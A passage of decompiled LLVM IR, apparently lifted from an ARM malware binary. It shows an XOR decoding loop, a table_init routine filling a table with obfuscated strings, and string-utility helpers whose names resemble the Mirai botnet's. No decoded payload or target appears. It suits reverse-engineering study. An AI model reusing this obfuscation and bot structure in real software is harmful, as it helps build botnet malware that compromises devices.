  %v2_105b8 = add i32 %v2_105b4, %v2_105c0
  %v3_105b8 = inttoptr i32 %v2_105b8 to i8*
  %v4_105b8 = load i8, i8* %v3_105b8, align 1
  %v6_105b8 = zext i8 %v4_105b8 to i32
  %v2_105bc = xor i32 %v6_105b8, %v0_105bc
  %v1_105c0 = trunc i32 %v2_105bc to i8
  store i8 %v1_105c0, i8* %v3_105b8, align 1
  %v2_105c4 = load i32, i32* %v1_105b4, align 4
  %v0_105c8 = load i32, i32* @ip, align 4
  %v2_105c8 = add i32 %v0_105c8, %v2_105c4
  %v3_105c8 = inttoptr i32 %v2_105c8 to i8*
  %v4_105c8 = load i8, i8* %v3_105c8, align 1
  %v6_105c8 = zext i8 %v4_105c8 to i32
  %v0_105cc = load i32, i32* %r6.global-to-local, align 4
  %v2_105cc = xor i32 %v0_105cc, %v6_105c8
  %v1_105d0 = trunc i32 %v2_105cc to i8
  store i8 %v1_105d0, i8* %v3_105c8, align 1
  %v2_105d4 = load i32, i32* %v1_105b4, align 4
  %v0_105d8 = load i32, i32* @ip, align 4
  %v2_105d8 = add i32 %v0_105d8, %v2_105d4
  %v3_105d8 = inttoptr i32 %v2_105d8 to i8*
  %v4_105d8 = load i8, i8* %v3_105d8, align 1
  %v6_105d8 = zext i8 %v4_105d8 to i32
  %v0_105dc = load i32, i32* %r5.global-to-local, align 4
  %v2_105dc = xor i32 %v0_105dc, %v6_105d8
  %v1_105e0 = trunc i32 %v2_105dc to i8
  store i8 %v1_105e0, i8* %v3_105d8, align 1
  %v2_105e4 = load i32, i32* %v1_105b4, align 4
  %v0_105e8 = load i32, i32* @ip, align 4
  %v2_105e8 = add i32 %v0_105e8, %v2_105e4
  %v3_105e8 = inttoptr i32 %v2_105e8 to i8*
  %v4_105e8 = load i8, i8* %v3_105e8, align 1
  %v6_105e8 = zext i8 %v4_105e8 to i32
  %v0_105ec = load i32, i32* %r4.global-to-local, align 4
  %v2_105ec = xor i32 %v0_105ec, %v6_105e8
  %v1_105f0 = trunc i32 %v2_105ec to i8
  store i8 %v1_105f0, i8* %v3_105e8, align 1
  %v3_105f4 = load i16, i16* %v2_10588, align 4
  %v4_105f4 = zext i16 %v3_105f4 to i32
  %v0_105f8 = load i32, i32* @ip, align 4
  %v1_105f8 = add i32 %v0_105f8, 1
  store i32 %v1_105f8, i32* @ip, align 4
  %v8_10600 = icmp sgt i32 %v4_105f4, %v1_105f8
  br i1 %v8_10600, label %dec_label_pc_105b4.dec_label_pc_105b4_crit_edge, label %dec_label_pc_10604.loopexit

dec_label_pc_105b4.dec_label_pc_105b4_crit_edge:  ; preds = %dec_label_pc_105b4
  %v0_105bc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_105b4

dec_label_pc_10604.loopexit:                      ; preds = %dec_label_pc_105b4
  %v2_10604.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10604

dec_label_pc_10604:                               ; preds = %dec_label_pc_10604.loopexit, %entry
  %v2_10604 = phi i32 [ %v2_10604.pre, %dec_label_pc_10604.loopexit ], [ %v3_10598, %entry ]
  store i32 %v2_10604, i32* @r4, align 4
  ret i32 %v2_10580

; uselistorder directives
  uselistorder i32 %v1_105f8, { 1, 2, 0 }
  uselistorder i32 %v1_105a8, { 1, 0 }
  uselistorder i32 %v2_10584, { 3, 0, 1, 2 }
  uselistorder i32 %v3_1057c, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10614 = load i32, i32* @r4, align 4
  %v6_10614 = load i32, i32* @r5, align 4
  %v9_10614 = load i32, i32* @r6, align 4
  %v12_10614 = load i32, i32* @r7, align 4
  %v15_10614 = load i32, i32* @r8, align 4
  %v21_10614 = load i32, i32* @sl, align 4
  %v24_10614 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_10620 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24fac.216 to i32), i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  store i32 %v0_10620, i32* @r5, align 4
  %v3_10638 = call i32 @util_memcpy(i32 %v0_10620, i32 ptrtoint (i32* @global_var_19b60.224 to i32), i32 2)
  store i32 13, i32* @r0, align 4
  %v0_10640 = load i32, i32* @r5, align 4
  store i32 %v0_10640, i32* @global_var_24fb4.225, align 4
  %v0_10644 = load i32, i32* @r6, align 4
  %v1_10644 = trunc i32 %v0_10644 to i16
  store i16 %v1_10644, i16* bitcast (i32* @global_var_24fb8.226 to i16*), align 4
  %v0_10648 = call i32 @malloc()
  store i32 %v0_10648, i32* @r5, align 4
  %v4_10658 = call i32 @util_memcpy(i32 %v0_10648, i32 ptrtoint ([14 x i8]* @global_var_19b64.228 to i32), i32 13)
  store i32 12, i32* @r0, align 4
  %v0_10664 = load i32, i32* @r5, align 4
  store i32 %v0_10664, i32* @global_var_24fbc.229, align 4
  store i16 13, i16* bitcast (i32* @global_var_24fc0.230 to i16*), align 4
  %v0_1066c = call i32 @malloc()
  store i32 %v0_1066c, i32* @r5, align 4
  %v4_1067c = call i32 @util_memcpy(i32 %v0_1066c, i32 ptrtoint ([13 x i8]* @global_var_19b74.232 to i32), i32 12)
  %v0_10684 = load i32, i32* @r6, align 4
  store i32 %v0_10684, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_24fc8.233 to i16*), align 4
  %v0_1068c = load i32, i32* @r5, align 4
  store i32 %v0_1068c, i32* @global_var_24fc4.234, align 4
  %v0_10690 = call i32 @malloc()
  %v0_10694 = load i32, i32* @r6, align 4
  store i32 %v0_10690, i32* @r5, align 4
  %v3_106a0 = call i32 @util_memcpy(i32 %v0_10690, i32 ptrtoint (i32* @global_var_19b84.236 to i32), i32 %v0_10694)
  store i32 36, i32* @r0, align 4
  %v0_106a8 = load i32, i32* @r5, align 4
  store i32 %v0_106a8, i32* @global_var_24fcc.237, align 4
  %v0_106ac = load i32, i32* @r6, align 4
  %v1_106ac = trunc i32 %v0_106ac to i16
  store i16 %v1_106ac, i16* bitcast (i32* @global_var_24fd0.238 to i16*), align 4
  %v0_106b0 = call i32 @malloc()
  store i32 %v0_106b0, i32* @r5, align 4
  %v4_106c0 = call i32 @util_memcpy(i32 %v0_106b0, i32 ptrtoint ([37 x i8]* @global_var_19b88.240 to i32), i32 36)
  store i32 6, i32* @r0, align 4
  %v0_106cc = load i32, i32* @r5, align 4
  store i32 %v0_106cc, i32* @global_var_24fd4.241, align 4
  store i16 36, i16* bitcast (i32* @global_var_24fd8.242 to i16*), align 4
  %v0_106d4 = call i32 @malloc()
  store i32 6, i32* @fp, align 4
  store i32 %v0_106d4, i32* @r5, align 4
  %v4_106e8 = call i32 @util_memcpy(i32 %v0_106d4, i32 ptrtoint ([7 x i8]* @global_var_19bb0.244 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r6, align 4
  %v0_106f4 = load i32, i32* @r5, align 4
  store i32 %v0_106f4, i32* @global_var_24fdc.245, align 4
  %v0_106f8 = load i32, i32* @fp, align 4
  %v1_106f8 = trunc i32 %v0_106f8 to i16
  store i16 %v1_106f8, i16* bitcast (i32* @global_var_24fe0.246 to i16*), align 4
  %v0_106fc = call i32 @malloc()
  %v0_10700 = load i32, i32* @r6, align 4
  store i32 %v0_106fc, i32* @r5, align 4
  %v4_1070c = call i32 @util_memcpy(i32 %v0_106fc, i32 ptrtoint ([8 x i8]* @global_var_19bb8.248 to i32), i32 %v0_10700)
  %v0_10710 = load i32, i32* @r6, align 4
  store i32 %v0_10710, i32* @r0, align 4
  %v0_10714 = load i32, i32* @r5, align 4
  store i32 %v0_10714, i32* @global_var_24fe4.249, align 4
  %v1_10718 = trunc i32 %v0_10710 to i16
  store i16 %v1_10718, i16* bitcast (i32* @global_var_24fe8.250 to i16*), align 4
  %v0_1071c = call i32 @malloc()
  %v0_10720 = load i32, i32* @r6, align 4
  store i32 %v0_1071c, i32* @r5, align 4
  %v4_1072c = call i32 @util_memcpy(i32 %v0_1071c, i32 ptrtoint ([8 x i8]* @global_var_19bc0.252 to i32), i32 %v0_10720)
  store i32 3, i32* @r0, align 4
  %v0_10734 = load i32, i32* @r5, align 4
  store i32 %v0_10734, i32* @global_var_24fec.253, align 4
  %v0_10738 = load i32, i32* @r6, align 4
  %v1_10738 = trunc i32 %v0_10738 to i16
  store i16 %v1_10738, i16* bitcast (i32* @global_var_24ff0.254 to i16*), align 4
  %v0_1073c = call i32 @malloc()
  store i32 %v0_1073c, i32* @r5, align 4
  %v4_1074c = call i32 @util_memcpy(i32 %v0_1073c, i32 ptrtoint ([4 x i8]* @global_var_19bc8.256 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_24ff8.257 to i16*), align 4
  %v0_1075c = load i32, i32* @r5, align 4
  store i32 %v0_1075c, i32* @global_var_24ff4.258, align 4
  %v0_10760 = call i32 @malloc()
  store i32 19, i32* @sl, align 4
  store i32 %v0_10760, i32* @r5, align 4
  %v3_10774 = call i32 @util_memcpy(i32 %v0_10760, i32 ptrtoint (i32* @global_var_19bcc.260 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_1077c = load i32, i32* @r5, align 4
  store i32 %v0_1077c, i32* @global_var_24ffc.261, align 4
  %v0_10780 = load i32, i32* @sl, align 4
  %v1_10780 = trunc i32 %v0_10780 to i16
  store i16 %v1_10780, i16* bitcast (i32* @global_var_25000.262 to i16*), align 4
  %v0_10784 = call i32 @malloc()
  store i32 %v0_10784, i32* @r5, align 4
  %v3_10794 = call i32 @util_memcpy(i32 %v0_10784, i32 ptrtoint (i32* @global_var_19be0.264 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  %v0_107a0 = load i32, i32* @r5, align 4
  store i32 %v0_107a0, i32* @global_var_25004.265, align 4
  store i16 24, i16* bitcast (i32* @global_var_25008.266 to i16*), align 4
  %v0_107a8 = call i32 @malloc()
  store i32 %v0_107a8, i32* @r5, align 4
  %v4_107b8 = call i32 @util_memcpy(i32 %v0_107a8, i32 ptrtoint ([10 x i8]* @global_var_19bfc.268 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_25010.269 to i16*), align 4
  %v0_107c8 = load i32, i32* @r5, align 4
  store i32 %v0_107c8, i32* @global_var_2500c.270, align 4
  %v0_107cc = call i32 @malloc()
  store i32 16, i32* @sb, align 4
  store i32 %v0_107cc, i32* @r5, align 4
  %v4_107e0 = call i32 @util_memcpy(i32 %v0_107cc, i32 ptrtoint ([17 x i8]* @global_var_19c08.272 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_107e8 = load i32, i32* @r5, align 4
  store i32 %v0_107e8, i32* @global_var_25014.273, align 4
  %v0_107ec = load i32, i32* @sb, align 4
  %v1_107ec = trunc i32 %v0_107ec to i16
  store i16 %v1_107ec, i16* bitcast (i32* @global_var_25018.274 to i16*), align 4
  %v0_107f0 = call i32 @malloc()
  store i32 %v0_107f0, i32* @r5, align 4
  %v4_10800 = call i32 @util_memcpy(i32 %v0_107f0, i32 ptrtoint ([23 x i8]* @global_var_19c1c.276 to i32), i32 22)
  %v0_10808 = load i32, i32* @r6, align 4
  store i32 %v0_10808, i32* @r0, align 4
  %v0_1080c = load i32, i32* @r5, align 4
  store i32 %v0_1080c, i32* @global_var_2501c.277, align 4
  store i16 22, i16* bitcast (i32* @global_var_25020.278 to i16*), align 4
  %v0_10814 = call i32 @malloc()
  %v0_10818 = load i32, i32* @r6, align 4
  store i32 %v0_10814, i32* @r5, align 4
  %v4_10824 = call i32 @util_memcpy(i32 %v0_10814, i32 ptrtoint ([8 x i8]* @global_var_19c34.280 to i32), i32 %v0_10818)
  store i32 5, i32* @r0, align 4
  %v0_1082c = load i32, i32* @r5, align 4
  store i32 %v0_1082c, i32* @global_var_25024.281, align 4
  %v0_10830 = load i32, i32* @r6, align 4
  %v1_10830 = trunc i32 %v0_10830 to i16
  store i16 %v1_10830, i16* bitcast (i32* @global_var_25028.282 to i16*), align 4
  %v0_10834 = call i32 @malloc()
  store i32 %v0_10834, i32* @r5, align 4
  %v4_10844 = call i32 @util_memcpy(i32 %v0_10834, i32 ptrtoint ([6 x i8]* @global_var_19c3c.284 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_25030.285 to i16*), align 4
  %v0_10854 = load i32, i32* @r5, align 4
  store i32 %v0_10854, i32* @global_var_2502c.286, align 4
  %v0_10858 = call i32 @malloc()
  store i32 %v0_10858, i32* @r5, align 4
  %v4_10868 = call i32 @util_memcpy(i32 %v0_10858, i32 ptrtoint ([5 x i8]* @global_var_19c44.288 to i32), i32 4)
  %v0_10870 = load i32, i32* @fp, align 4
  store i32 %v0_10870, i32* @r0, align 4
  %v0_10874 = load i32, i32* @r5, align 4
  store i32 %v0_10874, i32* @global_var_25034.289, align 4
  store i16 4, i16* bitcast (i32* @global_var_25038.290 to i16*), align 4
  %v0_1087c = call i32 @malloc()
  %v0_10884 = load i32, i32* @fp, align 4
  store i32 %v0_1087c, i32* @r5, align 4
  %v4_1088c = call i32 @util_memcpy(i32 %v0_1087c, i32 ptrtoint ([7 x i8]* @global_var_19c4c.292 to i32), i32 %v0_10884)
  store i32 14, i32* @r0, align 4
  %v0_10894 = load i32, i32* @r5, align 4
  store i32 %v0_10894, i32* @global_var_2503c.293, align 4
  %v0_10898 = load i32, i32* @fp, align 4
  %v1_10898 = trunc i32 %v0_10898 to i16
  store i16 %v1_10898, i16* bitcast (i32* @global_var_25040.294 to i16*), align 4
  %v0_1089c = call i32 @malloc()
  store i32 14, i32* @r7, align 4
  store i32 %v0_1089c, i32* @r5, align 4
  %v4_108b0 = call i32 @util_memcpy(i32 %v0_1089c, i32 ptrtoint ([15 x i8]* @global_var_19c54.296 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_108b8 = load i32, i32* @r5, align 4
  store i32 %v0_108b8, i32* @global_var_25044.297, align 4
  %v0_108bc = load i32, i32* @r7, align 4
  %v1_108bc = trunc i32 %v0_108bc to i16
  store i16 %v1_108bc, i16* bitcast (i32* @global_var_25048.298 to i16*), align 4
  %v0_108c0 = call i32 @malloc()
  store i32 8, i32* @r8, align 4
  store i32 %v0_108c0, i32* @r5, align 4
  %v4_108d4 = call i32 @util_memcpy(i32 %v0_108c0, i32 ptrtoint ([9 x i8]* @global_var_19c64.300 to i32), i32 8)
  %v0_108dc = load i32, i32* @r6, align 4
  store i32 %v0_108dc, i32* @r0, align 4
  %v0_108e0 = load i32, i32* @r8, align 4
  %v1_108e0 = trunc i32 %v0_108e0 to i16
  %v2_108e0 = load i32, i32* @r4, align 4
  %v4_108e0 = add i32 %v2_108e0, 276
  %v5_108e0 = inttoptr i32 %v4_108e0 to i16*
  store i16 %v1_108e0, i16* %v5_108e0, align 2
  %v0_108e4 = load i32, i32* @r5, align 4
  store i32 %v0_108e4, i32* @global_var_250bc.301, align 4
  %v0_108e8 = call i32 @malloc()
  %v0_108ec = load i32, i32* @r6, align 4
  store i32 %v0_108e8, i32* @r5, align 4
  %v4_108f8 = call i32 @util_memcpy(i32 %v0_108e8, i32 ptrtoint ([8 x i8]* @global_var_19c70.303 to i32), i32 %v0_108ec)
  %v0_10900 = load i32, i32* @sb, align 4
  store i32 %v0_10900, i32* @r0, align 4
  %v0_10904 = load i32, i32* @r6, align 4
  %v1_10904 = trunc i32 %v0_10904 to i16
  %v2_10904 = load i32, i32* @r4, align 4
  %v4_10904 = add i32 %v2_10904, 284
  %v5_10904 = inttoptr i32 %v4_10904 to i16*
  store i16 %v1_10904, i16* %v5_10904, align 2
  %v0_10908 = load i32, i32* @r5, align 4
  store i32 %v0_10908, i32* @global_var_250c4.304, align 4
  %v0_1090c = call i32 @malloc()
  %v0_10910 = load i32, i32* @sb, align 4
  store i32 %v0_1090c, i32* @r5, align 4
  %v4_1091c = call i32 @util_memcpy(i32 %v0_1090c, i32 ptrtoint ([17 x i8]* @global_var_19c78.306 to i32), i32 %v0_10910)
  store i32 23, i32* @r0, align 4
  %v0_10924 = load i32, i32* @r5, align 4
  store i32 %v0_10924, i32* @global_var_2504c.307, align 4
  %v0_10928 = load i32, i32* @sb, align 4
  %v1_10928 = trunc i32 %v0_10928 to i16
  store i16 %v1_10928, i16* bitcast (i32* @global_var_25050.308 to i16*), align 4
  %v0_1092c = call i32 @malloc()
  %v0_10938 = load i32, i32* @r6, align 4
  %v1_10938 = load i32, i32* @sb, align 4
  %v2_10938 = add i32 %v1_10938, %v0_10938
  store i32 %v2_10938, i32* @r6, align 4
  store i32 %v0_1092c, i32* @r5, align 4
  %v4_10940 = call i32 @util_memcpy(i32 %v0_1092c, i32 ptrtoint ([24 x i8]* @global_var_19c8c.310 to i32), i32 23)
  %v0_10944 = load i32, i32* @r8, align 4
  store i32 %v0_10944, i32* @r0, align 4
  %v0_10948 = load i32, i32* @r5, align 4
  store i32 %v0_10948, i32* @global_var_25054.311, align 4
  %v0_1094c = load i32, i32* @r6, align 4
  %v1_1094c = trunc i32 %v0_1094c to i16
  store i16 %v1_1094c, i16* bitcast (i32* @global_var_25058.312 to i16*), align 4
  %v0_10950 = call i32 @malloc()
  %v0_10958 = load i32, i32* @r8, align 4
  store i32 %v0_10950, i32* @r5, align 4
  %v4_10960 = call i32 @util_memcpy(i32 %v0_10950, i32 ptrtoint ([9 x i8]* @global_var_19ca4.314 to i32), i32 %v0_10958)
  %v0_10964 = load i32, i32* @r7, align 4
  store i32 %v0_10964, i32* @r0, align 4
  %v0_10968 = load i32, i32* @r5, align 4
  store i32 %v0_10968, i32* @global_var_2505c.315, align 4
  %v0_1096c = load i32, i32* @r8, align 4
  %v1_1096c = trunc i32 %v0_1096c to i16
  store i16 %v1_1096c, i16* bitcast (i32* @global_var_25060.316 to i16*), align 4
  %v0_10970 = call i32 @malloc()
  %v0_10978 = load i32, i32* @r7, align 4
  store i32 %v0_10970, i32* @r5, align 4
  %v4_10980 = call i32 @util_memcpy(i32 %v0_10970, i32 ptrtoint ([15 x i8]* @global_var_19cb0.318 to i32), i32 %v0_10978)
  %v0_10984 = load i32, i32* @sl, align 4
  store i32 %v0_10984, i32* @r0, align 4
  %v0_10988 = load i32, i32* @r5, align 4
  store i32 %v0_10988, i32* @global_var_25064.319, align 4
  %v0_1098c = load i32, i32* @r7, align 4
  %v1_1098c = trunc i32 %v0_1098c to i16
  store i16 %v1_1098c, i16* bitcast (i32* @global_var_25068.320 to i16*), align 4
  %v0_10990 = call i32 @malloc()
  store i32 ptrtoint ([20 x i8]* @global_var_19cc0.322 to i32), i32* @sb, align 4
  %v0_10998 = load i32, i32* @sl, align 4
  store i32 %v0_10990, i32* @r5, align 4
  %v4_109a4 = call i32 @util_memcpy(i32 %v0_10990, i32 ptrtoint ([20 x i8]* @global_var_19cc0.322 to i32), i32 %v0_10998)
  store i32 10, i32* @r0, align 4
  %v0_109ac = load i32, i32* @r5, align 4
  store i32 %v0_109ac, i32* @global_var_2506c.323, align 4
  %v0_109b0 = load i32, i32* @sl, align 4
  %v1_109b0 = trunc i32 %v0_109b0 to i16
  store i16 %v1_109b0, i16* bitcast (i32* @global_var_25070.324 to i16*), align 4
  %v0_109b4 = call i32 @malloc()
  store i32 %v0_109b4, i32* @r5, align 4
  %v4_109c4 = call i32 @util_memcpy(i32 %v0_109b4, i32 ptrtoint ([11 x i8]* @global_var_19cd4.326 to i32), i32 10)
  store i32 21, i32* @r0, align 4
  %v2_109d4 = load i32, i32* @r4, align 4
  %v4_109d4 = add i32 %v2_109d4, 292
  %v5_109d4 = inttoptr i32 %v4_109d4 to i16*
  store i16 10, i16* %v5_109d4, align 2
  %v0_109d8 = load i32, i32* @r5, align 4
  store i32 %v0_109d8, i32* @global_var_250cc.327, align 4
  %v0_109dc = call i32 @malloc()
  store i32 %v0_109dc, i32* @r5, align 4
  %v3_109ec = call i32 @util_memcpy(i32 %v0_109dc, i32 ptrtoint (i32* @global_var_19d38.329 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_25078.330 to i16*), align 4
  %v0_109fc = load i32, i32* @r5, align 4
  store i32 %v0_109fc, i32* @global_var_25074.331, align 4
  %v0_10a00 = call i32 @malloc()
  store i32 %v0_10a00, i32* @r5, align 4
  %v4_10a10 = call i32 @util_memcpy(i32 %v0_10a00, i32 ptrtoint ([18 x i8]* @global_var_19ce0.333 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  %v0_10a1c = load i32, i32* @r5, align 4
  store i32 %v0_10a1c, i32* @global_var_2507c.334, align 4
  store i16 17, i16* bitcast (i32* @global_var_25080.335 to i16*), align 4
  %v0_10a24 = call i32 @malloc()
  store i32 %v0_10a24, i32* @r5, align 4
  %v4_10a34 = call i32 @util_memcpy(i32 %v0_10a24, i32 ptrtoint ([13 x i8]* @global_var_19cf4.337 to i32), i32 12)
  %v0_10a3c = load i32, i32* @r7, align 4
  store i32 %v0_10a3c, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_25088.338 to i16*), align 4
  %v0_10a44 = load i32, i32* @r5, align 4
  store i32 %v0_10a44, i32* @global_var_25084.339, align 4
  %v0_10a48 = call i32 @malloc()
  %v0_10a50 = load i32, i32* @r7, align 4
  store i32 %v0_10a48, i32* @r5, align 4
  %v4_10a58 = call i32 @util_memcpy(i32 %v0_10a48, i32 ptrtoint ([15 x i8]* @global_var_19cb0.318 to i32), i32 %v0_10a50)
  %v0_10a5c = load i32, i32* @sl, align 4
  store i32 %v0_10a5c, i32* @r0, align 4
  %v0_10a60 = load i32, i32* @r5, align 4
  store i32 %v0_10a60, i32* @global_var_2508c.340, align 4
  %v0_10a64 = load i32, i32* @r7, align 4
  %v1_10a64 = trunc i32 %v0_10a64 to i16
  store i16 %v1_10a64, i16* bitcast (i32* @global_var_25090.341 to i16*), align 4
  %v0_10a68 = call i32 @malloc()
  %v0_10a6c = load i32, i32* @sb, align 4
  %v0_10a70 = load i32, i32* @sl, align 4
  store i32 %v0_10a68, i32* @r5, align 4
  %v4_10a78 = call i32 @util_memcpy(i32 %v0_10a68, i32 %v0_10a6c, i32 %v0_10a70)
  %v0_10a7c = load i32, i32* @r8, align 4
  store i32 %v0_10a7c, i32* @r0, align 4
  %v0_10a80 = load i32, i32* @r5, align 4
  store i32 %v0_10a80, i32* @global_var_25094.342, align 4
  %v0_10a84 = load i32, i32* @sl, align 4
  %v1_10a84 = trunc i32 %v0_10a84 to i16
  store i16 %v1_10a84, i16* bitcast (i32* @global_var_25098.343 to i16*), align 4
  %v0_10a88 = call i32 @malloc()
  %v0_10a90 = load i32, i32* @r8, align 4
  store i32 %v0_10a88, i32* @r5, align 4
  %v4_10a98 = call i32 @util_memcpy(i32 %v0_10a88, i32 ptrtoint ([9 x i8]* @global_var_19d04.345 to i32), i32 %v0_10a90)
  store i32 5, i32* @r0, align 4
  %v0_10aa0 = load i32, i32* @r5, align 4
  store i32 %v0_10aa0, i32* @global_var_2509c.346, align 4
  %v0_10aa4 = load i32, i32* @r8, align 4
  %v1_10aa4 = trunc i32 %v0_10aa4 to i16
  store i16 %v1_10aa4, i16* bitcast (i32* @global_var_250a0.347 to i16*), align 4
  %v0_10aa8 = call i32 @malloc()
  store i32 %v0_10aa8, i32* @r5, align 4
  %v4_10ab8 = call i32 @util_memcpy(i32 %v0_10aa8, i32 ptrtoint ([6 x i8]* @global_var_19d10.349 to i32), i32 5)
  %v0_10ac0 = load i32, i32* @fp, align 4
  store i32 %v0_10ac0, i32* @r0, align 4
  %v0_10ac4 = load i32, i32* @r5, align 4
  store i32 %v0_10ac4, i32* @global_var_250a4.350, align 4
  store i16 5, i16* bitcast (i32* @global_var_250a8.351 to i16*), align 4
  %v0_10acc = call i32 @malloc()
  %v0_10ad4 = load i32, i32* @fp, align 4
  store i32 %v0_10acc, i32* @r5, align 4
  %v4_10adc = call i32 @util_memcpy(i32 %v0_10acc, i32 ptrtoint ([7 x i8]* @global_var_19d18.353 to i32), i32 %v0_10ad4)
  %v0_10ae4 = load i32, i32* @r6, align 4
  store i32 %v0_10ae4, i32* @r0, align 4
  %v0_10ae8 = load i32, i32* @fp, align 4
  %v1_10ae8 = trunc i32 %v0_10ae8 to i16
  %v2_10ae8 = load i32, i32* @r4, align 4
  %v4_10ae8 = add i32 %v2_10ae8, 260
  %v5_10ae8 = inttoptr i32 %v4_10ae8 to i16*
  store i16 %v1_10ae8, i16* %v5_10ae8, align 2
  %v0_10aec = load i32, i32* @r5, align 4
  store i32 %v0_10aec, i32* @global_var_250ac.354, align 4
  %v0_10af0 = call i32 @malloc()
  %v0_10af8 = load i32, i32* @r6, align 4
  store i32 %v0_10af0, i32* %r5.global-to-local, align 4
  %v4_10b00 = call i32 @util_memcpy(i32 %v0_10af0, i32 ptrtoint ([24 x i8]* @global_var_19d20.356 to i32), i32 %v0_10af8)
  %v0_10b08 = load i32, i32* @r6, align 4
  %v1_10b08 = trunc i32 %v0_10b08 to i16
  %v2_10b08 = load i32, i32* @r4, align 4
  %v4_10b08 = add i32 %v2_10b08, 268
  %v5_10b08 = inttoptr i32 %v4_10b08 to i16*
  store i16 %v1_10b08, i16* %v5_10b08, align 2
  %v0_10b0c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10b0c, i32* @global_var_250b4.357, align 4
  store i32 %v3_10614, i32* @r4, align 4
  store i32 %v6_10614, i32* @r5, align 4
  store i32 %v9_10614, i32* @r6, align 4
  store i32 %v12_10614, i32* @r7, align 4
  store i32 %v15_10614, i32* @r8, align 4
  store i32 %v21_10614, i32* @sl, align 4
  store i32 %v24_10614, i32* @fp, align 4
  ret i32 %v4_10b00

; uselistorder directives
  uselistorder i32 %v0_10af0, { 1, 0 }
  uselistorder i32 %v0_10acc, { 1, 0 }
  uselistorder i32 %v0_10a88, { 1, 0 }
  uselistorder i32 %v0_10a68, { 1, 0 }
  uselistorder i32 %v0_10a48, { 1, 0 }
  uselistorder i32 %v0_10990, { 1, 0 }
  uselistorder i32 %v0_10970, { 1, 0 }
  uselistorder i32 %v0_10950, { 1, 0 }
  uselistorder i32 %v0_1092c, { 1, 0 }
  uselistorder i32 %v0_1090c, { 1, 0 }
  uselistorder i32 %v0_108e8, { 1, 0 }
  uselistorder i32 %v0_108c0, { 1, 0 }
  uselistorder i32 %v0_1089c, { 1, 0 }
  uselistorder i32 %v0_1087c, { 1, 0 }
  uselistorder i32 %v0_10814, { 1, 0 }
  uselistorder i32 %v0_107cc, { 1, 0 }
  uselistorder i32 %v0_10760, { 1, 0 }
  uselistorder i32 %v0_1071c, { 1, 0 }
  uselistorder i32 %v0_106fc, { 1, 0 }
  uselistorder i32 %v0_106d4, { 1, 0 }
  uselistorder i32 %v0_10690, { 1, 0 }
  uselistorder i32 %v0_10620, { 1, 0 }
  uselistorder i32 23, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24fac.216 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10bac = load i8, i8* %arg1, align 1
  %v2_10bb0 = icmp eq i8 %v3_10bac, 0
  %v0_10bb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10bb0, i32 %v0_10bb4)
  br label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bbc, %entry
  %v0_10bbc = phi i32 [ %v1_10bbc, %dec_label_pc_10bbc ], [ 0, %entry ]
  %v1_10bbc = add i32 %v0_10bbc, 1
  %v2_10bc0 = add i32 %v1_10bbc, %tmp
  %v3_10bc0 = inttoptr i32 %v2_10bc0 to i8*
  %v4_10bc0 = load i8, i8* %v3_10bc0, align 1
  %v6_10bc0 = zext i8 %v4_10bc0 to i32
  store i32 %v6_10bc0, i32* @r3, align 4
  %v2_10bc4 = icmp eq i8 %v4_10bc0, 0
  br i1 %v2_10bc4, label %dec_label_pc_10bcc, label %dec_label_pc_10bbc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bbc
  ret i32 %v1_10bbc
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_10bd0 = load i8, i8* %arg1, align 1
  %v3_10bd0 = zext i8 %v2_10bd0 to i32
  store i32 %v3_10bd0, i32* @r2, align 4
  %v2_10bd4 = icmp eq i8 %v2_10bd0, 0
  br i1 %v2_10bd4, label %bb, label %dec_label_pc_10be0

bb:                                               ; preds = %entry
  store i32 %v3_10bd0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10bf4

dec_label_pc_10be0:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10be4, %dec_label_pc_10be0
  %v0_10be4 = phi i32 [ %v1_10be4, %dec_label_pc_10be4 ], [ 0, %dec_label_pc_10be0 ]
  %v1_10be4 = add i32 %v0_10be4, 1
  store i32 %v1_10be4, i32* %ip.global-to-local, align 4
  %v2_10be8 = add i32 %v1_10be4, %tmp
